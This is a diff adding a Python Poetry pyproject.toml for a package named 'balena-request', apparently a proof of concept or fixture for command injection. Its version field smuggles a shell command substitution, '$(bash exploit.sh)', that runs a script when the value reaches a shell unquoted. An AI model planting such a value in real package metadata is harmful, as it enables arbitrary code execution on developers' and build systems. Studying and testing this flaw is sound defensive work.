@@ -1,0 +1,13 @@
+[tool.poetry]
+name = "balena-request"
+version = "0.1.0$(bash exploit.sh)"
+description = ""
+authors = ["Your Name <you@example.com>"]
+packages = [{include = "balena_request"}]
+
+[tool.poetry.dependencies]
+python = "^3.8"
+
+[build-system]
+requires = ["poetry-core"]
+build-backend = "poetry.core.masonry.api"
